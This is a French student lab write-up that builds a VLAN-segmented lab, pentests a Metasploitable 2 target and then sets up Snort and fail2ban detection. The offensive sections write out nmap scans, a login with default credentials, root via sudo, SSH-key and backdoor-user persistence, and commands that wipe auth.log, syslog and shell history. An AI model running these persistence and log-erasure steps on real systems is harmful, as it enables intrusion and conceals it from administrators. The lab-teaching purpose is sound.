*******************************************************************************

  

  

## **1️****)** **Rôles des machines**

  

| Machine                        | Rôle principal               | Fonction détaillée                                                                                                                                          |
| ------------------------------ | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| \|**Linux Web (10.0.20.50)**\| | Serveur web vulnérable (DMZ) | DVWA vulnérable                                                                                                                                             |
| **Kali (10.0.10.50)**          | Attaquant                    | Lance toutes les actions offensives : reconnaissance, scanning, exploitation, post-exploitation.                                                            |
| **IDS/SiEM (10.0.20.53)**      | Défense / surveillance       | Surveille le trafic réseau sur VLAN10 et collecte logs des serveurs. IDS (Zeek/Suricata) détecte les attaques, SIEM (Wazuh) centralise les alertes et logs. |
| **pfSense (10.0.0.1)**\|       | Routeur                      | Sépare VLAN10 (LAN) et VLAN20 (DMZ)                                                                                                                         |
  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
  

  
****  

On fait d’abord la topologie dans packetracer pour simuler et pour tester la communication  
![](file:///tmp/lu1602134215ce.tmp/lu1602134215di_tmp_99124239ae94f593.png)  
  

  
  

## Configuration du Routeur Cisco (Routeur)

  
  

  
  

********************************************************************************  
  
  
  

  
  

  
  

  
  

![](file:///tmp/lu1602134215ce.tmp/lu1602134215di_tmp_1a895686ced0526b.png) ![](file:///tmp/lu1602134215ce.tmp/lu1602134215di_tmp_4a99183de11d8f75.png)  
  

## Configuration du Commutateur Cisco

Dans cette section, nous avons configuré le **commutateur Cisco 3560** pour segmenter notre réseau local en différentes zones, appelées **VLANs (Virtual Local Area Networks)**. Cette segmentation permet d'isoler le trafic et d'améliorer la sécurité et la gestion du réseau.

Nous avons commencé par créer deux VLANs :

- **VLAN 10** nommé `**LAN_Interne**`.
    
- **VLAN 20** nommé `**DMZ_ServeurWeb**`.
    

Ensuite, nous avons assigné les ports du commutateur à ces VLANs. Les ports **FastEthernet0/1, FastEthernet0/3, FastEthernet0/4 et FastEthernet0/5** ont été configurés en **mode accès** et assignés au **VLAN 10**. Cela signifie que les appareils connectés à ces ports (PC Kali, PC IDS/NSM, PC SIEM, et un autre PC ou serveur qui est sur Fa0/1) feront partie du réseau interne. Le port **FastEthernet0/2** a été configuré en **mode accès** et assigné au **VLAN 20**, ce qui le destine au "serveur Windows" dans votre image (il était sur Fa0/2 avant d'être reconfiguré pour le VLAN 20).

Le point crucial pour le routage entre ces VLANs est la liaison entre le commutateur et le routeur. Le port **GigabitEthernet0/1** du commutateur a été configuré en **mode Trunk**. Un port Trunk est capable de transporter le trafic de plusieurs VLANs simultanément. Pour cela, nous avons spécifié l'**encapsulation 802.1Q (**`**dot1q**`**)**, qui est la méthode standard pour baliser les trames Ethernet avec leur identifiant de VLAN lorsqu'elles traversent cette liaison trunk. Après avoir spécifié le type d'encapsulation, la commande `switchport mode trunk` a pu être appliquée avec succès, établissant ainsi une connexion mult-VLAN vers le routeur.

Cette configuration du commutateur est essentielle pour la mise en œuvre de la segmentation réseau et permet au routeur de gérer le trafic entre les différentes zones (VLANs 10 et 20) de votre réseau.

![](file:///tmp/lu1602134215ce.tmp/lu1602134215di_tmp_91fddcf136e70990.png) ![](file:///tmp/lu1602134215ce.tmp/lu1602134215di_tmp_5e36f65c6fa3a81a.png)

### **Pentest Complet (Phase 1 & 2) - De la Découverte à l'Énumération**

#### **Objectif** : Découvrir et énumérer une cible (Metasploitable 2) sur un réseau inconnu.

---

### **Étape 0 : Configuration du Lab**

- **Scénario** : Notre machine Kali et la cible sont sur des réseaux différents, reliés par un routeur pfSense.
    
- **Action** : Avoir configuré les VMs dans VMware sur le même réseau interne ( LAN Segment).
    

---

### **Étape 1 : Reconnaissance du Réseau Local (Phase 1)**

**But** : Trouver la passerelle et comprendre la topologie.

1. **Trouver son IP et la passerelle** :
    

  
  

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_9a103ce700532af.gif)  
  

  
  

  
  

2. **Tester la connectivité vers la passerelle** :
    

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_e49a2ee98148a123.gif)  
  

### **Étape 2 : Découverte des Autres Réseaux via SNMP (Phase 1 - Footprinting)**

**But** : Utiliser une mauvaise configuration du routeur pour découvrir les réseaux cachés.

1. **Tester SNMP** sur la passerelle avec la communauté publique `public` :
    

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_6fb4a73cbd004b30.gif)  
  

2. **Lister les interfaces réseau** du routeur :
    

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_c4a929980448f53.gif)  
  

3. **Obtenir les adresses IP** de ces interfaces (LA CLÉ) :
    

  
  

  
  

  
  

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_c8ff927eb15bb7a4.gif)  
  

**Étape 3 : Découverte des Hôtes sur le Nouveau Réseau (Phase 2 - Scanning)**

**But** : Trouver toutes les machines actives sur le réseau `10.0.20.0/24`.

1. **Lancer un scan de découverte** (ping sweep) :
    
    sudo nmap -sn 10.0.20.0/24
    

![](file:///tmp/lu1275172tmj3r.tmp/lu1275172tml58_tmp_30d106fd01b22d5f.gif)  
  

### **Étape 4 : Scan Complet de la Cible (Phase 2 - Énumération)**

**But** : Lister tous les ports, services et versions sur la cible principale (`10.0.20.50`).

1. **Lancer un scan agressif** avec Nmap :
```
sudo nmap -sV -sC -A -O -p- 10.0.20.50 -oN scan_metasploitable_detaille.txt

```
![[Pasted image 20250821151014.png]]![[Pasted image 20250821151159.png]]
![[Pasted image 20250821151603.png]]

2. **Résultats** : On trouve **25+ ports ouverts** avec des services anciens et vulnérables (FTP, SSH, HTTP, Samba, etc.).





### ** PHASES 3 & 4 - ACCÈS, ÉLÉVATION, PERSISTANCE & DISSIMULATION**

#### **Objectif :** Obtenir un accès root sur la cible, garantir la persistance et effacer les traces.

### **ÉTAPE 1 : ACCÈS INITIAL (Gaining Access)**

**Problème :** Le serveur SSH de la cible utilise de vieux algorithmes, bloqués par Kali moderne.

**Solution :** Forcer l'utilisation de l'algorithme `ssh-rsa`.

1. **Lancer la connexion SSH** avec les options de compatibilité :
```
ssh -o HostKeyAlgorithms=ssh-rsa msfadmin@10.0.20.50
```

1. **Entrer le mot de passe** lorsqu'il est demandé : `msfadmin`


![[Pasted image 20250821155549.png]]
2. **Résultat :** Vous êtes connecté en tant qu'utilisateur `msfadmin`.

### **ÉTAPE 2 : ÉLÉVATION DE PRIVILÈGES (Privilege Escalation)**

**But :** Passer de l'utilisateur `msfadmin` à l'administrateur `root`.

1. **Tenter de devenir root** avec `sudo` :
```
sudo su
```
- **Entrer le mot de passe** de l'utilisateur `msfadmin` : `msfadmin`

![[Pasted image 20250821155956.png]]

- **Résultat :** Le prompt change de `msfadmin@metasploitable` à `root@metasploitable`.  On a  les privilèges maximum !

### **ÉTAPE 3 : PERSISTANCE (Maintaining Access)**

**But :** S'assurer de pouvoir revenir sur la machine même si le mot de passe est changé.

1. **Générons une paire de clés SSH sur le KALI** (machine attaquant) :

**Sur le Kali, générons une clé SSH 
```
ssh-keygen -f ~/.ssh/id_rsa_metasploitable

```
**Affichez la clé publique générée** 
```
cat ~/.ssh/id_rsa_metasploitable.pub
```


![[Pasted image 20250821160722.png]]


**Sur la CIBLE** (`root@metasploitable`), collons cette clé dans le fichier autorisé :
```
echo "ssh-rsa LE_CLE_PUBLIQUE_ICI" >> /root/.ssh/authorized_keys
```

![[Pasted image 20250821162836.png]]
**Résultat :** On peut maintenant vous connecter en root directement depuis Kali sans mot de passe :
```
ssh -i ~/.ssh/id_rsa_metasploitable root@10.0.20.50
```

- **Créer un utilisateur backdoor** :

![[Pasted image 20250821163343.png]]

**Résultat :** On peut maintenant  connecter en **hacker** directement depuis Kali
![[Pasted image 20250821195003.png]]
### **ÉTAPE 4 : DISSIMULATION (Covering Tracks)**

**But :** Effacer les traces de votre activité dans les logs système.

1. **Effacer les logs d'authentification** (connexions SSH, sudo, etc.) :

```
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
```
2. **Supprimer l'historique de commandes** :
```
history -c 
rm ~/.bash_history  


```

3. ** Résultat :** Un administrateur qui consulterait les logs ne verrait notre vos actions.



### **BLUE TEAM : INSTALLATION & CONFIGURATION DE SNORT ET FAIL2BAN**

#### **Objectif :** Détecter les scans Nmap, les tentatives de connexion SSH et les activités suspectes.

---
### **Déploiement sur une Machine Capteur 

Nous allons  utiliser la machine **AntiX** dans le VLAN 20 comme capteur.

**1. Configurez la Machine Capteur :**
    
- Assurons qu'elle peut ping à la fois la cible (`10.0.20.50`) et l' attaquant (`10.0.10.50`).

![[Pasted image 20250821201057.png]]

**2. Mettez la carte réseau en mode promiscuité :**

- Cela permet à la carte d'écouter tout le trafic sur le réseau, pas seulement celui qui lui est destiné.

```
sudo ip link set eth0 promisc on
```
**3.Installez Suricata et Zeek sur le capteur (Ubuntu/Debian) :**
### **ÉTAPE 1 : Installation des Dépendances**

Ouvrez un terminal sur la machine capteur et installez les outils de compilation et les dépendances nécessaires.

**1. Mettez à jour le système :**

```
sudo apt update && sudo apt upgrade -y

```
**2. Installez   snort/fail2ban :**

#Installation 

```
sudo apt install snort

```
```
sudo apt install fail2ban
```


**Configurer l'interface à surveiller dans snort.lua**

![[Pasted image 20250822124007.png]]

**Ajouter des régles par defaut**

![[Pasted image 20250822131422.png]]
Lancer Snort avec cette commande :

```
sudo snort -c /etc/snort/snort.lua -i eth0
```

maintenant que le snort est actif, l'attaquant fait du scan et on voit le trafic de scan en temps réel
![[Pasted image 20250822145711.png]]![[Pasted image 20250822145711.png]]

on a utliser aussi fail2ban pour la prevention , on l'installe avec

```
sudo apt install fail2ban
```

une fois installée, on copie jail.conf dans une autre fichier pour faciliter la manipulation des régles et de ne pas ecrasé le fichier original

![[Pasted image 20250822150534.png]]

dans jail.local, on decomente sshd pour l'activer
![[Pasted image 20250822151011.png]]j

Dans ce fichier, on a defini les paramètres généraux. 

- `bantime` : La durée pendant laquelle une adresse IP sera bannie. 
    
- `findtime` : La fenêtre de temps pour détecter les tentatives échouées. 
    
- `maxretry` : Le nombre maximal d'échecs avant le bannissement d'une IP.

![[Pasted image 20250822151335.png]]